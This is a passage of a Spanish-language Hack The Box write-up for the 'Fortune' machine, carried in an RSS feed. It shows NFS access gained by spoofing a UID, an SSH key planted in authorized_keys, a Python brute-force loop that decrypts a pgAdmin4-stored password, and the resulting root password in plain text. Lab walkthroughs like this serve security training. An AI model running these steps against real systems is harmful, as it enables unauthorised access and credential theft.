&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~# groupadd --gid &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; charlie_group
root@kali:~# useradd --uid &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; --groups charlie_group charlie_user
root@kali:~# sudo -u charlie_user ls -l tmp_nfs/charlie
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con ello logramos acceder y obtener tambien nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-43-48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-45-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que tenemos acceso a la carpeta de charlie podemos agregar nuestra clave ssh a &lt;code&gt;authorized_keys&lt;/code&gt; para poder logearnos con el servicio ssh como charlie.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-55-26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;De la misma forma para el usuario bob:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-21%2000-50-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;escalacion-de-privilegios&#34;&gt;ESCALACION DE PRIVILEGIOS&lt;/h1&gt;
&lt;p&gt;Dentro de la carpeta charlie nos encontramos con un archivo &lt;code&gt;mbox&lt;/code&gt;, que contiene un mensaje de bob para charlie.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-58-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dice que bob cambio la contraseña para el usuario dba es la misma que la del usuario root, haciendo una enumeracion de carpetas y archivos nos encontramos un archivo &lt;code&gt;pgadmin4.db&lt;/code&gt; que contiene tablas que le pertenecen a &lt;code&gt;pgadmin3.4&lt;/code&gt;, utilizando sqlite db browser, dentro de este archivo encontramos una contraseña y usuario &lt;code&gt;dba&lt;/code&gt; especificamente en la tabla de &lt;code&gt;server&lt;/code&gt;, tambien una tabla que contiene usuario y contraseña de bob y charlie.&lt;/p&gt;
&lt;p&gt;Ruta del archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/var/appsrv/pgadmin4/pgadmin4.db
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-13-19.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos la ruta donde se encuentran los documentos de pgadmin dentro del archivo &lt;code&gt;pgadmin4.ini&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-14-06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;dba&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2016-56-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;bob y charlie&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2016-58-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;usuario-root&#34;&gt;Usuario ROOT&lt;/h2&gt;
&lt;p&gt;En la ruta de pgadmin4 local (&lt;code&gt;/usr/local/pgadmin4/pgadmin4-3.4/web/utils/)&lt;/code&gt;, encontramos un archivo llamado crypto.py, en su interior encontramos funciones las cuales encriptan y desencriptan contraseñas (&lt;code&gt;encrypt(), decrypt(), pad(), pqencryptpassword()&lt;/code&gt;), la funcion de &lt;code&gt;encrypt()&lt;/code&gt; necesita un texto y una clave, la funcion &lt;code&gt;decrypt()&lt;/code&gt; el texto encriptado (&lt;code&gt;ciphertext&lt;/code&gt;) anteriormente con la funcion &lt;code&gt;encrypt()&lt;/code&gt; y la clave, con estas dos funciones y la contraseña que se encuentra en la tabla de server del usuario &lt;code&gt;dba&lt;/code&gt;, podemos intentar desencriptarla solo nos falta la clave (key).&lt;/p&gt;
&lt;p&gt;Dentro de la base de datos (pgadmin4.db) encontramos algunas claves (tabla -&amp;gt; keys) que podriamos utilizar para la funcion decrypt(), de igual forma los usuarios (tabla -&amp;gt; users) y contraseñas (tabla -&amp;gt; users).&lt;/p&gt;
&lt;p&gt;Localmente agregamos el siguiente codigo a nuestro archivo crypto.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;

    &lt;span class=&#34;n&#34;&gt;list_keys&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;operator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;www&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postgresql&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pgadmin4&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fortune&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;charlie&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;bob&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nfsuser&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;authpf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pgadmin3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bob@fortune.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;charlie@fortune.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;saQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;R_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;qIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dba&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postgres&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    
    &lt;span class=&#34;n&#34;&gt;pass_dba&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz&amp;#34;&lt;/span&gt;
    
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list_keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pass_dba&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; : &amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Esta porcion de codigo contiene una lista de las claves (keys) probables para la contraseña (&lt;code&gt;pass_dba&lt;/code&gt;) del usuario dba que corresponde igualmente para el usuario root, dentro de las claves tambien encontramos usuarios, ya que una key podria ser o no el nombre de un usuario, de igual manera agregamos las contraseñas de la base de datos de los usuarios bob y charlie. En resumen agregamos a la lista todas las posibles claves que encontramos dentro de la maquina. Al correr nuestro script obtenemos el siguente resultado:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-39-55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuestra contraseña para el usuario dba y para root es &lt;code&gt;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!&lt;/code&gt;, la clave que fue satisfactoria fue una contraseña en este caso la contraseña de bob que se encuentra en la base de datos. Asi obtenemos nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-42-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/fortune/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/fortune/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>openssl</category>
            
          
            
              <category>rpcinfo</category>
            
          
            
              <category>nfs</category>
            
          
            
              <category>showmount</category>
            
          
            
              <category>authpf</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>